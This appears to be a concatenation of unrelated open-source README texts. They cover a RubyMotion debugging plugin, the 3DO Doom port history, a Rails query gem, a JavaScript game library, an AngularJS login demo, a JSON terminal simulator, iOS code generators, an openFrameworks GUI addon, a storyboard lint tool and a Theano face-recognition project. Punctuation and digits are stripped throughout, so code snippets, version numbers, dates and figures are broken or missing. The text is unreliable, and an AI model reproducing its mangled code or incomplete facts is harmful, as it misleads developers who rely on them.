included automatically this plugin provides two screenshots of the current screen one that mimics how a sightless person would see your app and another that mimics how a very color blind person would see it each one is at best  an approximation  but the goal is that having this quick metric handy will encourage more developers to spend some time on accessibility a little goes a long way this plugin generated a lot of excitement when i announced xray at the rubymotion conference inspect we had all heard austin seraphin s austinseraphin talk the previous day about how to improve accessibility this plugin tries to provide a visualization of the recommendations he gave us first and foremost he recommended that you should at least set the accessibilitylabel on custom views the left side shows a screenshot of your app with only red and green squares green squares mean you re doing ok it does not mean that your app has good accessibility but at a minimum you should at least get all your screens in the green before you send your app to an accessibility consultant the other screenshot is a your app in black and white with colors desaturated an attempt to mimic how a color blind person would see your app there are many types of color blindness and down the road i would love to see a few different screen shots for each specific type in this pane for now it takes the common denominator approach which is to remove all color included automatically this plugin requires more involvement in your application code if you want to make it useful you basically need to use the motion xray log log family of methods and each of them will write to the motion xray logplugin log buffer here s a quick way to do this log motion xray log log info info log error an error occurred log level log warning or you can write a log method yourself that calls one of the motion xray log methods if you use cocoalumberjack it should be very easy to hook up motion xray log  but it will have to be done in obj c i think i took a stab at it but gave up when i couldn t access the message property the upside to using these motion xray log methods is that they use pretty coloring they output to both the console and the xray log and i m planning on including some awesome print like features to the log methods in the future or more likely delegate to awesome print if it s available writing an xray plugin  my hope is that you will identify places in your app where you would benefit from on device feedback here are just some ideas as examples  building an app that interacts with bluetooth devices how about signal strength devices detected connect and disconnect buttons  interfacing with an api logging requests logging parameters sent and responses interface to send arbitrary requests  building a game framerate number of textures on screen to find out when the performance breaks down on the device you can t trust the simulator so let s get to it i will use some code from accessibilityplugin in this first the most basic plugin structure class accessibilityplugin plugin name accessibility as you want it to appear in the toolbar canvas is the view where the plugin will be placed you do not need to call addsubview on this object def pluginview canvas return uiview initwithframe canvas bounds so far we have named our plugin accessibility returned an empty container let s add our two image views we ll make use of geomotion which is required def pluginview canvas return uiview alloc initwithframe canvas bounds tap do and view and view backgroundcolor black uicolor accessibility uibutton alloc initwithframe view bounds thinner view bounds width and  colorblind uibutton alloc initwithframe view bounds thinner view bounds width and  right view bounds width and  view accessibility view colorblind when the plugin is activated we should grab a screenshot of the app and assign it to each view the show method is called on a plugin when it is selected dispatch queue main async do colorblind setimage getcolorblindimage forstate normal uicontrolstate dispatch queue main async do accessibility setimage getaccessibilityimage forstate normal uicontrolstate the accessibilityplugin does a few more things like show spinners display a big screenshot image on touch and i haven t implemented the get accessibilitycolorblind image methods here but hopefully this is enough for you to get the gist of writing a plugin here is the entire list of methods that you can call or get called on a plugin name the name as it appears in the toolbar view stores the plugin view that is returned by pluginview this method is only created once much like uiviewcontroller loadview target the view that has been selected in the ui picker pluginview canvasview the view returned by this method will be placed in canvasview when your plugin is selected edit target called when a new view is chosen in the ui picker you should call super  which assigns this view to the target property then you can update self view with any changes that you need to apply show called when your plugin is selected this will always be after edit target hide called just before your plugin is removed from the canvas register your new plugin in the appdelegate application didfinishlaunchingwithoptions method class appdelegate def application application didfinishlaunchingwithoptions launchoptions window motion xray xraywindow alloc initwithframe uiscreen mainscreen bounds window makekeyandvisible include the saveuiplugin which is not included by default motion xray register motion xray saveuiplugin new include a custom plugin motion xray register customplugin new return true dependencies  xray depends on geomotion which i don t feel bad about and sugarcube i would consider removing the sugarcube dependency because not everyone uses it but sugarcube adds a ton of benefit like tos and uicolor additions

27351671, the complete archive for doom for the do  yes this is the infamous port of doom for the do firstly this was the product of ten intense weeks of work due to the fact that i was misled about the state of the port when i was offered the project i was told that there was a version in existance with new levels weapons and features and it only needed polishing and optimization to hit the market after numerous requests for this version i found out that there was no such thing and that art data interactive was under the false impression that all anyone needed to do to port a game from one platform to another was just to compile the code and adding weapons was as simple as dropping in the art uh no my friends at do were begging for doom to be on their platform and with christmas  coming soon i took this job in august of  with a mid october golden master date  i literally lived in my office only taking breaks to take a nap and got this port completed shortcuts made  i had no time to port the music driver so i had a band that art data hired to redo the music so all i needed to do is call a streaming audio function to play the music this turned out to be an excellent call because while the graphics were lackluster the music got rave reviews do s operating system was designed around running an app and purging there was numerous bugs caused by memory leaks so when i wanted to load the logicware and id software logos on startup the do leaked the memory so to solve that i created two apps one to draw the do logo and the other to show the logicware logo after they executed they were purged from memory and the main game could run without loss of memory there was a electronic arts logo movie in the data because there was a time that ea was going to be distributing the game however the deal fell through the vertical walls were drawn with strips using the cell engine however the cell engine can t handle d perspective so the floors and ceilings were drawn with software rendering i simply ran out of time to translate the code to use the cell engine because the implementation i had caused texture tearing i had to write my own string h ansi c library because the one do supplied with their compiler had bugs string h how can you screw that up they did i spent a day writing all of the functions i needed in arm  assembly this game used burgerlib  my first c version of burgerlib because burgerlib was originally written in  for the snes and the apple iigs if you check out burgerlib  the current version also on github  you d notice that some code is still in use i hope that everyone who looks at this code learns something from it and i d be happy to answer questions about the hell i went through to make this game i only wished i had more time to actually polish this back in  so instead of being the worst port of doom it would have been the best one and one more thing  the intellectual property of doom is the exclusive property of zenimax no transfer of the intellectual property of doom or any transfer of the ownership of the sounds art or other game assets are given nor implied if anyone wishes to release a version of doom do commercially contact zenimax for a license the source code go for it rebecca ann heineman olde skuul seattle wa

22079149, easily create robust standardized api endpoints using lightning fast database queries fastapi is a rails library for querying interdependent datasets quickly and returning a human readable standard api output it works by constructing complex sql queries that make efficient use of joins and subqueries based upon model dependencies namely belongsto  hasone  and hasmany in only a few lines of code you can decide which fields you wish to expose to your endpoint any filters you wish to run the data through and create your controller this gem requires oj    for jsonification activerecord    and activesupport    fastapi currently supports postegresql as a data layer fastapi is available via rubygems using gem install fastapi otherwise in any gemfile in a rails project use require fastapi let s say we have three models person  bucket  and marble each bucket belongs to a person and can have many marbles your model for bucket might look something like this class bucket activerecord base belongsto person hasmany marbles assume bucket also has the fields color  and material each marble can have color and radius every person has a name  gender and age we want to expose a list of buckets as a jsonified api endpoint that contains records that look like the following javascript id  color blue  material plastic  person id  name mary anne  gender female  age  marbles id  color red  radius  id  color green  radius  in order to do that we first look at our bucket model and add the following class bucket activerecord base belongsto person hasmany marbles a standard interface is a list of user exposed fields for the endpoint fastapistandardinterface color material person marbles we then modify our person model class person activerecord base person is not top level in the case of the buckets endpoint we use a special setting indicating which fields to use if person happens to be nested you can not include dependent fields here belongsto hasmany this is a hard and fast fastapi rule that prevents overly complex nesting scenarios fastapistandardinterfacenested name gender keep in mind that this will only affect the cases where person is a nested if we wanted to expose a top level person api endpoint we would use fastapistandardinterface as well finally we must modify our marble model in the same way class marble activerecord base fastapistandardinterfacenested color radius hmm let s say we only want to list the marbles that have a radius less than or equal to  easy we go back and modify our bucket model add the following to class bucket activerecord base top level filters affect the data that is shown while filters on hasmany fields affect which rows are shown per record fastapidefaultfilters marbles radiuslte  phew we re almost done now to create the endpoint first open config and routes rb and add the following namespace api do namespace v defaults format json do resource buckets we now create a route to an api controller for bucket in app and controllers and api and v and bucketscontroller rb can also use rails generate controller api v buckets in the terminal class api v bucketscontroller applicationcontroller def index filters request queryparameters render json bucket fastapi filter filters response boom run your server with rails server and hop your way over to buckets in the fastapi standard json format try to filter your datasets as well there are many to play with go nuts fastapi has four core components  activerecord base extension that adds necessary class and instance methods  class fastapi which is instantiated by an activerecord base instance  filters which provide a way of easily interfacing with your data  fastapi standard output a strict way of displaying all fastapi responses fastapistandardinterface fields array sets the standard interface for the top level of a fastapi response can use any available fields for the model or belongsto and hasmany associations be sure to use the correct word form singular vs plural fastapistandardinterfacenested fields array sets the standard interface for the second level of a fastapi response nested will be referred to whenever this model is found nested in another api response can use any available fields for the model does not support associations fastapidefaultfilters filters hash sets any default filters for the top level fastapi response will be overridden if the same filter keys are provided when calling filter on a fastapi instance see filters section for more information on available fastapisafefields fields array sets safe fields for fastapiinstance safefilter these safe fields are a whitelist for filters meaning safefilter will only allow filtering by these fastapi shorthand for the fastapi constructor equivalent to fastapi new mymodel recommended usage is mymodel fastapi fastapi instances provide a way to interface with your datasets and obtain necessary information for an api response or otherwise initialize model model activerecord base constructor automatically called using model fastapi  but can be used as fastapi new model binds the provided model to the fastapi instance filter filters hash  meta hash compiles and executes an sql query based on the supplied filters see filters section for more details can add additional fields to the expected meta response in the output as keys in the meta hash safefilter filters hash  meta hash compiles and executes an sql query based on the supplied filters see filters section for more details will only allow filtering by fields set in fastapisafefields  or fastapistandardinterface if not set can add additional fields to the expected meta response in the output as keys in the meta hash intended for use with filters request queryparameters fetch id integer  meta hash similar to filter but will retrieve a single object based on a single id ideal for show on a resource as fastapi will still format the response appropriately and give a customized error for id not found returns a hash containing the data from the most recently executed filter or fetch call datajson returns a jsonified string containing the information in data returns a hash containing the metadata from the most recently executed filter or fetch call metajson returns a jsonified string containing the information in meta tohash returns a hash containing both the data and metadata from the most recently executed filter or fetch call response intended to return the final api response returns a jsonified string containing the information available in the tohash method reject message string access denied returns a jsonified string representing a standardized empty api response with a provided error message for example if a user is not allowed to access a resource you would call render json model fastapi reject filters are a powerful tool in fastapi that allow for granular control of your api responses fastapiinstance filter accepts them and they are also used in activerecord base fastapidefaultfilters filters work in the following way model fastapi filter key  key three will grab a subset of all models where key is  and key is three what if we want to find a subset of models where key is greater than or equal to  model fastapi filter keygte  it s that easy the double underscore indicates you re using a filter comparator and gte stands for g reater t han or e qual to the available comparators are as follows descriptions marked with indicate scalar inputs will be converted to arrays scalar fields is field value not field value gt field value gte field value lt field value lte field value like field contains value string notlike field does not contain value string ilike field contains value case ins notilike field does not contain value case ins null field is null notnull field is not null in field is in value notin field is not in value array fields subset field is a subset of value notsubset field is not a subset of value contains value is a subset of field notcontains value is not a subset of field intersects field and value have shared elements notintersects field and value have no shared elements if your key contains a double underscore make sure to use the is comparator if you look for a specific value if you d like to allow for client side data filtration highly recommended  simply use the following in your api endpoint controller filters request queryparameters render json model fastapi filter filters response this will allow you to use filters and their comparators in the http query parameters could return all active users between  and  years old while using fastapi boolean fields are automatically detected and the strings t and f are converted to true and false  respectively the same goes for integers converted from string to int in fastapi sorting is accomplished using a special filter order order can be in the format of key  keydirection or key direction where direction is asc or desc default asc an example order users by age ascending render json user fastapi filter order age asc response or perhaps via http hitting an endpoint with request queryparameters as the filter in fastapi we opted for very robust granular control of api responses pages do not exist in a strict sense but rather by offset and count  much like you d expect in a traditional database query for example render json model fastapi filter offset  count  response would return up to  results from model beginning at result number  page  at  results per page fastapi has a very strict standard way of outputting data in the form of a response responses will always look like the following javascript meta total  count  offset  error null data where meta total is the total number of records in the entire dataset meta count is the number of records in the response meta offset is the offset of the first record of the response and meta error is null if there was no error or a string containing an error message if there was an error data will always be an array of objects if there was an error with the response data will be empty if the response was formed by a fastapiinstance fetch call and a record was retrieved data will be a length  array thanks for reading we welcome contributors with good ideas and we re always looking for new talent licensed

and introspection general purpose object pooling garbage collection bad automatic super fast object pooling good class and object ids linkedlist a high performance double linked list device a device independent map well a start at one anyway i like building big high performance things like games in javascript but along the way i found some issues object oriented the best of the javascript class systems thanks to prototype and class js and javascript mvc and tweaked a few things pooling garbage collection is a pain for a high performance apps so rather than implementing it sporadically we built a way to easily pool any class linked lists we needed a way of storing game objects in a super fast way so we included a high speed linked list we included some other tools like a simple performance measurement tim down s awesome hashtable and a device lookup for some general game shimming a modified version of class js to cater to static inheritance and deep object cloning based

speed minimal overhead collection for small numbers of objects this class maintains mutual set of doubly linked lists in order to differentiate between objects that are in use and those that are unallocated from the pool this allows for much faster cycling of only the in use objects pools are managed by class type and will auto expand as required you can create a custom initial pool size by deriving from the pool class and statically overriding initialpoolsize keep in mind that objects that are pooled are not constructed they are reset when handed out you need to acquire one and then reset its state usually via a static create factory method javascript point gamecore pooled point  and and derive from gamecore pooled and and static constructor create function x y and and super will handle allocation from a managed pool of objects and and the pool will autoexpand as required var n this super n x x n y y return n x  y  and and instance init function x y this x x this y y to then

speed doubly linked list of objects note that for speed reasons using a dictionary lookup of cached nodes there can only be a single instance of an object in the list at the same time adding the same object a second time will result in a silent return from the add method in order to keep a track of node links an object must be able to identify itself with a getuniqueid function to add and remove an item use javascript list add newitem list remove newitem you can iterate using the first member of the list then the next method of each node such as javascript var node list first while node node

stats for all currently created pools pool stats are enabled by default and have very little overhead tracing is useful for tracking down where you ve forgotten to release an object back into the pool by turning on tracing for a pool the system will track every acquire request with the source code file and line number you can run your game with tracing on and then dump the stats to see where acquire calls are being made in your code the output is in the form of javascript class methodname source file url line column usage count for example javascript tracing is slow so only turn it on for the pools you re debugging to enable tracing grab the pool class you re interested in and set tracing to true javascript gamecore pool getpool fighter starttracing you can stop the tracing by calling

redirect handling how to declare a state how to declare a state cd angular login example npm install bower install grunt clone the repo and try declaring a new state with how to declare a state how to declare a state altough i recommend reading some of the page in order to understand the implications of what you re doing this project is an example about how to build a very robust login system using angularjs it manages tokens for users to login they can be managed customly server side server side is absent on this demo  you can make them expire and change permissions without worrying about leaving a non consistant state on the client side please note this is an example because it s just a demostration and can act as a starting point for your implementation if you re looking for a library that gets login done in your angularjs application in  minutes this is not what this project is about yes there are other projects trying to cover authentication limitations of angularjs vs server side solutions i would recommend fnakstad s project angular client side auth  and his blogposts fnakstad blogpost there is also another project http interceptor about managing non authorized http requests the main differences in fnakstad s implementation against this one is that he serves a cookie upfront when serving the index html page this cookie has all the information needed regarding the user permissions i really didn t want to mess with cookies in my client side code a note about cookies they are handled in an uncommon way in expressjs they are not rolling cookies  it s a clever implementation to me but it s not what a php and net developer expects or your boss expects secondly this works with a restful api service and functionality and my implementation and fnakstad s and and and and and and simplicity and  and  and and no dependencies and  and  and and easier compatibility and  and  and and no server changes and  and  and and restful support and  and  and and handles errors and  and  and and hackish and  and  and and less code recursion and  and  and in a decently sized application user banning and authorization revocation might be an important of the login department doing this using cookies it s tricky expressjs or any other backend usually doesn t give you direct access to the cookie array the usual workaround is to write an usertoken inside the cookie and then revoke that token when revoked you have to clear the cookie as personal taste i haven t found it particularly elegant so a more radical and direct approach you should know this one in this release the dev team has put routing in a separate file because there are alternative projects like this is the star here after messing my life using libraries like backbone layoutmanager backbone layoutmanager  i can say this is a far more thinked solution incredibly stable and elegant solution to be only at version    this part of angularjs kit is made mainly for testing purposes on this demo is used to simulate a backend server with ms response time the following properties are overridable at config time injecting loginserviceprovider javascript angular module myapp module  config function loginserviceprovider errorstate myapp originalwaytoerror usertoken mmmlljn default value is obtained through localstorage getitem usertoken you can override this and use cookies sqlite anything custom works aswell from url ex and somepath usertoken xxmmyym it s a string the name of a the default state that handles the statechangeerror in the example this state comes with a parameter in the url please note that a state must have a parameter in the url even if it the parameters gets passed by state go and not writing them actually in the url if the parameters are not  registered  in the url they get filtered and never reach stateparams it s a string the name of the state the user gets redirected after the logoutuser has been processed function that gets called on the first initialization of the provider it reads the usertoken  and if it s set sets the http headers function called by the previous one and by the next one it is a setter for http defaults headers  nothing more function that registers the user in the localstorage in this implementation then calls setheaders  to make sure headers are coherent with the token given function that gets called on the first initialization of the provider registers the listeners on statechangestart  statechangesuccess  statechangeerror  in order to manage permissions and error redirection synchronous check on permissions if the service already has the informations about the user in short if it s an anonymous user  authorize or denies it handles spinner appearance handles spinner disappear manages error redirection in case of any resolve fails even the grandfather grandfather one important function that gets called once the grandfather grandfather receives the informations from the server arguments should be function data status headers config the same as http success and http error angular http it updates loginservice user with the json  that should be  in the first argument this is the place where to put custom logic in case you don t have a server that gives you a correct userrole  you can generate it manually looking at other custom informations given by the server response accepts as only argument an httppromise  it s usually called from a controller and simply calls the above loginhandler for now accepts as only argument an httppromise  it redirects the user to the logoutstate logoutstate function used in the grandfather grandfather resolve  it includes an asynchronous check on permissions returns a q promise angular promise that gets resolved in case the user can access the requested state rejected otherwise this property might have  states null  or a valid userrole from routing config js routing config this property gets updated by loginhandler loginhandler  pay attention this gets done using angular extend angular extend boolean property indicating if the user is logged with an userrole different than userroles anonymous  useful to display the user status in your angularjs application boolean property indicating if the loginservice is waiting for the grandfather s resolve to be completed in order to check if the user can or cannot access the requested state boolean property might have  states null  false  true null loginservice hasn t done it s work yet false loginservice is waiting for some http promise to get completed true loginservice got answer from http so the values must be considered final should be handy for displaying loading spinners as done on this example while this demostration has some code behind the user checking problem in a single page application is actually more a logic problem when to check permissions how to get required informations  instead of a coding problem as you can see if you meddle with the code the so called grandfather is an abstract angular ui router abstractstate state that is the father of all the states the state logic in angular ui router is based off a n ary state tree the root of this tree is the grandfather being abstract only means it gets executed but cannot be transitioned into exactly what we need check permissions asynchronously i think it s a clever and handy bit based security system in this demo you can see there is a double check on user permissions to transition to a state the former is a synchronous check on all the statechangestart events this must be synchronous because events for their nature can only be prevented in a sync way but since we need it to do a server side request the first real check is done after an http request the latter is inside the resolvependingstate resolvependingstate method called from the grandfather state in this example just after it obtained the valid user informations to let the user access a state or not here s a brief call schema of the app and the service and how they interact with the user request bare in mind this is for the user to get a general idea the real amount of calls might be higher or slightly different custom errors can be generated in your own resolve s  for example javascript angular module myapp module  config function stateprovider stateprovider state app somestate  url and random and url  resolve resourceneeded function q var strangedeferred q defer if math random   strangedeferred resolve you have been lucky else if math random   strangedeferred reject not lucky enough else strangedeferred reject real bad luck   return strangedeferred promise  will generate a not lucky enough and and real bad luck error into the statechangeerror statechangeerror handler the default behaviour is to redirect to errorstate errorstate but if you want a redirect to a custom state you just have to add this to the previous example javascript angular module myapp module  config function stateprovider stateprovider state app somestate  url and random and url  resolve  and previous resolve here and redirectmap not lucky enough state app error  prefix luck  real bad luck app specialbadluck important note if you decide to use the object version prefix is not optional if you don t want a prefix just use the object version is mostly in case there is a state that handles many errors and you want to differentiate them using a string prefix the string version is shorter and more usable use what s more appropriate for you http errors gets handled in a very similar way the error is based on the statuscode converted to string given by the httppromise error javascript angular module myapp module  config function stateprovider stateprovider state app criticalstate  url and random and url  resolve httprequestneeded function http and let s suppose the responding statuscode is  and return http get and whatever and url  redirectmap  state app httperrors  prefix criticalstate and in the app httperrors s state template and div ng switch this example using angularjs   rc doesn t have routeprovider but angular ui router has urlrouterprovider  as shown on app js this is sufficient to declare redirects use his very well written wiki to read howto angular ui router urlprovider the correct way to declare a state for your application is to have it depend on app grandfather also the state needs to be called app something  because the grandfather state is called app in a way to be the father of any state for example a section of your single page application might be declared as funny js javascript angular module myapp funny  myapp grandfather config function stateprovider stateprovider state app funny  url and funny  templateurl and funny and funny tpl html  controller funnycontroller  resolve getrandomfunnyfacts function http return http get and funnygenerator  redirectmap nofunfound app saderror controller funnycontroller  function scope

7075480, jsterm is a terminal simulator that uses a json filesystem to see it in use most of this was written awhile ago when i knew javascript about as well as i know spanish which is a little but not much it is due for a rewrite with some cool new features like pipes writable files and other magic at the bottom of the js and jsterm js js and jsterm js file there is a series of term enqueue calls this is where the commands are set that are run when the page loads other changes can be made to personalize your terminal the directory structure is as follows commands that can be run add new commands here information change things like the prompt here term init call in js and jsterm js js and jsterm js to change which filesystem is loaded for the loading of the filesytem to work locally you must server the files in the directory from a local server to do this easily change into the jsterm directory and run python m simplehttpserver  a filesystem is a recursive grouping of json arrays of objects each nested array represents the listing of items in a directory each object in the array defines a file or directory for an example see json and sample json json and sample json this is a script that will create a jsterm filesystem from a real directory examples of how to make different file types are as follows text file no execute permissions this is a text file executable and link must be marked executable image file can be any image file with a standard extension e g png jpg if you use jsterm it would be great if you could link to this github repo thanks

16960682, we love xcode  it s been adding way cool features at a really fast pace and adopting these features is the quickest way to bliss in life or at least ios development bliss but sometimes these boss new features don t quite get all the way in the interest of meeting the tools halfway we present three small code generators to improve your life in subtle ways unfortunately to get the full benefits you have to set your deployment target to ios  otherwise xcode will dutifully put all of the images into your app bundle but totally ignore all of your resizable insets with only a build warning but shucks the important and awesome part is the editor and it puts all of the data out in super readable json we should be able to do a poor man s version that reads in the data and spits out some code to give you most of the benefits call objc assetgen with the xcassets paths as arguments from the directory into which it should output the code for an asset catalog named foo containing image sets bar and baz  you ll get foocatalog h and foocatalog m  with class methods and uiimage barimage and and uiimage bazimage put them in your derivedsources folder and you re good to go on mac os x the standard system color picker has a tab for palette based colors system color picker documentation and colorpicker png one little known feature of this color picker tab is that you can create your own palettes and fill them with the custom colors for your app running the tool will also install the palette into your system color picker so the other developers on your team can use your colors in their storyboards call objc colordump with the clr paths as arguments from the directory into which it should output the code for a color palette named foo colors named bar and baz  you ll get foocolorlist h and foocolorlist m  with class methods and uicolor barcolor and and uicolor bazcolor put them in your derivedsources folder and you re good to go at least i think so but if you go and search for more information on storyboards one of the first things you ll find is this stack overflow answer we already fixed the part about code reuse with objc colordump  and now we can fix the parts about failures at runtime if we generate some code to turn your string identifiers and that s any kind of string identifier be it a view controller identifier a segue identifier or a cell reuse identifier into compiler checked constants we can avoid a whole class of problems call objc identifierconstants with the storyboard paths as arguments from the directory into which it should output the code for a storyboard named foo with view controller identifier bar and segue identifier baz somewhere in it you ll get foostoryboardidentifiers h and foostoryboardidentifiers m with extern nsstring const foostoryboardbaridentifier and extern nsstring const foostoryboardbazidentifier in it put them in your derivedsources folder and you re good to go dt code  and code and dt dd target ios  in addition to ios  and dd dt code o lt path and code and dt dd output files at code lt path and code and dd dt code f lt path and code and dt dd search for input files starting from code lt path and code and dd dt code p lt prefix and code and dt dd use code lt prefix and code as the class prefix in the generated code and dd dt code h and code and dt dd print this help and exit and dd dt code lt paths and code and dt dd input files this and and or f are required and dd thanks and happy generating

3287481, a user interface library and addon for openframeworks ofxui is an addon for openframeworks version    and that easily allows for the creation of user interfaces aka guis ofxui also takes care of widget layout spacing font loading saving and loading settings and widget callbacks ofxui can be easily customized colors font widget sizes padding layout etc ofxui contains a collection of minimally designed graphical user interface gui widgets including buttons push state toggle image label button matrices dropdown menus sliders rotary range vertical horizontal number dials d pads text input areas base draws ofimages oftexture offbo etc image sliders image buttons image color sampler value plotters moving graphs waveform spectrum graphs radio toggles text areas sortable list this library allows for rapid ui design and development it uses oftruetypefonts for nice font rendering widget layout is semi automatic and can be easily customized ofxui is a gl based gui and uses openframework s drawings calls to render its widgets it integrates into openframeworks projects very easily since it was designed specifically for of there are many examples included in the download that show how to add widgets customize their placement get values from different types of widgets set widget values add callback functions for gui events saving and loading settings and more this ui library was inspired influenced by apple s user interface in terms of performance i haven t compared it to other guis out there but since its written using of drawing calls and uses listeners built in to of it run very fast and doesn t take a lot of cpu cycles atleast when i tested it when my sketches on my laptop apple macbook pro  without vertical sync the all widgets example runs upwards of  fps on a personal note i designed ofxui so that if i present my work to a client or put out an app on the app store it would have a decent aesthetic and be presentable to non hackers and programmers i really like the widgets in maxmsp so i wanted to have something similar so when i prototype in c and and i could easily go about creating a ui that is pleasing to use and works robustly additionally i was motived to write my own since i wanted something like controlp which is easy to get up and running for processing for of i use controlp a lot and love its minimal aesthetic i also love simplegui for cinder but since i primarily code using of i developed ofxui with the intentions that it needs to be minimally designed intuitive to use easily integrated flexible and customizable when i first started programming with c and and it was difficult for me to use the other guis their either depended on other libraries which weren t included in the download and it wouldn t work out of the box or they were complicated to integrate into my projects additionally i was motived to write my own since i wanted something like controlp which is easy to get up and running for processing for of i use controlp a lot and love its minimal aesthetic i also love simplegui for cinder but since i primarily code using of i developed ofxui with the intentions that it needs to be minimally designed intuitive to use easily integrated flexible and customizable openframeworks    and this tutorial will provide step by step instructions on how to get started with ofxui for this we are going to be assuming you are using openframeworks    and for osx however these instructions should be easily adaptable for ios after downloading or cloning ofxui place it in your openframeworks addons folder create a new openframeworks project using the project generator make sure ofxui and ofxxmlsettings are enabled from the list of addons shown open the project in xcode now select your ofapp h file and add include ofxui h under include ofmain h then in your ofapp h file create a new ofxuicanvas object within the ofapp class like so ofxuisupercanvas gui in addition create two functions void exit void guievent ofxuieventargs e switch over to your ofapp cpp file and define the exit and guievent functions void ofapp exit void ofapp guievent ofxuieventargs e within the setup function we are going to initialize the gui object and add widgets to it so one way to do that is gui new ofxuisupercanvas ofxui tutorial and and creates a canvas at  using the default width in the exit function we have to delete the gui after we are done using the application but before this we want to tell the gui to save the current values in the widgets to an xml file thus your exit function should look like void ofapp exit gui savesettings settings xml delete gui we are now going to add a slider widget to the gui automatically size the gui to fit all the widgets add an event listener to the ofapp load settings from an xml file called settings xml gui addslider background     gui autosizetofitwidgets ofaddlistener gui newguievent this ofapp guievent gui loadsettings settings xml note the second to last line adds a listener and callback so the gui knows what function to call once a widget is triggered or interacted with by the user don t worry if its doesn t make too much sense right now you ll get the hang of it the last line tells the gui to load settings widget values from a saved xml file if the file isn t present it uses the default value of the widgets now to the guievent function we need to react to the user input the argument of the guievent function ofxuieventargs e  contains the widget which was modified to access the widget we do the following void testapp guievent ofxuieventargs e if e getname background ofxuislider slider e getslider ofbackground slider getscaledvalue note the if statement compares the widget s name with background it does that via a string comparison if the widget s name is background  then its the slider widget we created earlier the slider s value is retrieved by the getscaledvalue function lets add a toggle to toggle the window between fullscreen and window mode in the setup function add another widget after the slider widget gui addtoggle fullscreen  false we have to now respond to the fullscreen toggle widget so we add more functionality to our guievent function in the end it should look like void testapp guievent ofxuieventargs e if e getname background ofxuislider slider e getslider ofbackground slider getscaledvalue else if e getname fullscreen ofxuitoggle toggle e gettoggle ofsetfullscreen toggle getvalue  note so you can see adding other kinds of widgets and reacting to them are done in a very similar manner explore the examples to check out how to access some of the more complex widgets and variable binding so callbacks are needed as often i hope you ll see thats its pretty intuitive i tried my best to limit the amount of code that needs to be written however i kept it open enough so people can be expressive with it if you lost your way somewhere in the tutorial don t worry the whole project is included in the examples in the ofxui addon folder note if you don t need to save and load the gui settings and don t want to include ofxxmlsettings in your project you can set the following define in your project build settings ofxuinoxml ofxui was and is developed by reza ali www syedrezaali com and and syed reza ali gmail com and and rezaali since its release in early  its had more than  commits and now has  contributors camilo obviousjim prisonerjohn syedhali falconever soylentgraham nickhardeman bilderbuchi danomatika rc emmanuelgeoffray samdraz danoli

16973478, storyboardlint  a lint tool for uistoryboard to find wrong classes and wrong storyboard and segue and reuse identifiers background  two big reasons are you can only use string literals as identifiers for view controllers and segues in your storyboards you need those same string literals again in your source code when referencing anything in your storyboard so you have your ids in two or more places and no way to know if the ids you use in your code actually exist in your storyboard you have no way of knowing whether your storyboard references classes in your source code that don t exist anymore fear not  with storyboardlint you can finally make sure that your code and your storyboards are in sync at least to a certain degree storyboardlint does the following things makes sure your uitableviewcell and uicollectionviewcell reuse identifiers are named according to either your own or storyboardlint s default naming convention makes sure your storyboard and segue identifiers are named according to either your own or storyboardlint s naming convention makes sure that all custom classes that are references from your storyboard actually exist is your code makes sure that all string literals in your code that reference reuse identifiers storyboard identifiers and segue identifiers according to a given or default naming convention actually exist in your storyboard s produces output that is parsable by xcode so you can easily plug storyboardlint into your build process warnings right in your source code warnings about bugs in your storyboard naming convention  in order for storyboardlint to find the string literals in your code that contain reuse and storyboard and segue identifiers you need to prefix and and or suffix them in a consistent way if you don t provide any options this is the default reuse identifiers start with ruid example ruidproducttableviewcell storyboard identifiers start with sb example sbproductsviewcontroller segue identifiers start with seg example segproductdetailssegue however if you already use a certain naming convention or if you would prefer a different one you can tell storyboardlint about it using these commandline arguments storyboard prefix example storyboardlint and code and myproject storyboard prefix mygreatprefix storyboard suffix example storyboardlint and code and myproject storyboard suffix mygreatsuffix the same goes for segue prefix  segue suffix  reuse prefix and reuse suffix you are even allowed to provide both a prefix and a suffix naming your identifiers according to a consistent naming convention should not be too much work and it will be worth it ideally you already have string constants for these things in your code so that you only have to edit two places your string constant in code and the respective value in your storyboard installation  just install the ruby gem sudo gem install storyboardlint in your xcode project simply add a run script build phase in order to run storyboardlint every time you build  go to your project and select your project s target in the targets section  go to build phases  select from the menu editor add build phase add run script build phase  paste this command into the run script section storyboardlint srcroot this will use the default naming convention alternatively you can provide options to tell storyboardlint about our own naming conventions for example storyboardlint srcroot storyboard suffix storyboard segue suffix segue reuse suffix reuseid  that s it

22452642, implementation of deepid using theano the structure of my code look like that    convnet       deepidclass py       deepidgenerate py       layers py       loaddata py       sampleoptimization py    dataprepare    vectorizeimg py    youtubedatasplit py    youtubeimgcrop py just as the names of the folders imply there are two modules without reference to each other in my code the dataprepare module is used to prepare data and the convnet module is the implemention of deepid there are two parts which are important and neccessary for the amazing performance of deepid namely the net structure of the convolutional neural network and the data i had asked the author for the data got nothing but a polite reply so in my experiment some other data are used instead take the youtube face data as an example there are three levels of folders which is showed below youtubedata and    peoplefoldera       videofoldera          img jpg          img jpg          imgn jpg       videofolderb    peoplefolderb the first thing need to be done is to seperate the data into train set and validate set the way i choose train set and validate set is as below mix the imgs of the same person but different videos together random shuffle choose first  imgs as validate set choose the  sup th and sup to  sup th and sup imgs as the train set at last i get  imgs as the validation set and  imgs as the train set obviously you will know that there are  classes persons totally note the file prefixed with youtube is specifically for the youtube data because of the folder structure and the img property so if you want to deal with some other dataset please read the code of imgcrop py and datasplit py and re implement them i believe the code is readable and easy to understand for the readers used to get the face out of the img face in youtube data has been aligned into the center of the img so this programme aims to increase the ratio of the face in the whole img and resize the img into   which is the input size for the deepid usage python youtubeimgcrop py aligneddbfolder newfolder aligneddbfolder source folder newfolder the programme will generate the whole folder structure the same as the source folder with all the imgs are processed into new size used to split data into two set one is for train and one is for valid usage python youtubedatasplit py srcfolder testsetfile trainsetfile the format of testsetfile and trainsetfile is like below there are two parts in one line the first is path of the img the second is label of the img youtube and alanball and  and aligneddetect  jpg youtube and alanball and  and aligneddetect  jpg youtube and xiangliu and  and aligneddetect  jpg youtube and xiangliu and  and aligneddetect  jpg used to vectorize the imgs to make the thousands of imgs into a two d array whose size is mn m is the number of samples n is the    to avoid occurance of super big file vectorizeimg py automatically seperate data into batches with  samples in each batch usage python vectorizeimg py testsetfile trainsetfile testvectorfolder trainvectorfolder testsetfile generated by datasplit py trainsetfile generated by datasplit py testvectorfolder the folder name to store the vector files of validate set trainvectorfolder the folder name to store the vector files of train set now it s the exciting time in the convnet module there are five programme files layers py definition of different types of layer including logisticregression hiddenlayer lenetconvlayer poollayer and 